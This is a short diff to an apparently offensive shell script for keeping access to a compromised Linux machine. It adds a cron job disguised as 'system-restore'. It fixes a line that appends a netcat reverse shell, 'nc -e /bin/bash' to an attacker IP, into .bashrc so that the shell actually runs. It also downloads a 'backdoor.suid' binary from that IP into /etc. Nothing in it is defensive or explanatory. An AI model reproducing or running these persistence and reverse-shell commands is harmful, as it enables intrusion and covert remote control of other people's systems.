@@ -12,7 +12,7 @@ CT=$(crontab -l)
 CT=$CT$'\n1  * * * * system-restore || run-parts --report /etc/cron.hourly'
 printf "$CT" | crontab -
 
-echo 'nc -e /bin/bash $IP $PORT 2>dev/null &' >> .bashrc
+echo 'nc -e /bin/bash $IP $PORT 2>/dev/null &' >> .bashrc
 
 #suid bit shell
 wget -O /etc/popularity-contest $IP:6121/backdoor.suid
